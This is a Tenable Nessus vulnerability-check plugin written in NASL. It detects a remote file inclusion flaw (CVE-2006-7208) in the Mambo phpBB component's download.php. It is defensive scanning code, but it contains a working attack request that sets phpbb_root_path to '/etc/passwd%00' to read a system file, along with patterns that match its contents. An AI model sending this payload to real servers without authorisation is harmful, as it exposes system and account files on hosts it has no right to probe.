#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(22021);
  script_version("1.17");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-7208");
  script_bugtraq_id(18914);
  script_xref(name:"EDB-ID", value:"1995");

  script_name(english:"Mambo phpBB Component download.php phpbb_root_path Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file include attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running the phpBB component for Mambo, a web-based
bulletin board. 

The version of the phpBB component for Mambo installed on the remote
host fails to sanitize input to the 'phpbb_root_path' parameter of the
'download.php' and other scripts before using it to include PHP code. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit these flaws to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(20);

  script_set_attribute(attribute:"plugin_publication_date", value:"2006/07/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adam_van_dongen:phpbb_component");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("mambo_detect.nasl");
  script_require_keys("www/mambo_mos");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(
    item:string(
      dir, "/components/com_forum/download.php?",
      "phpbb_root_path=", file
    ), 
    method:"GET",
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0extension\.inc.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (contents)
    {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    }
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}
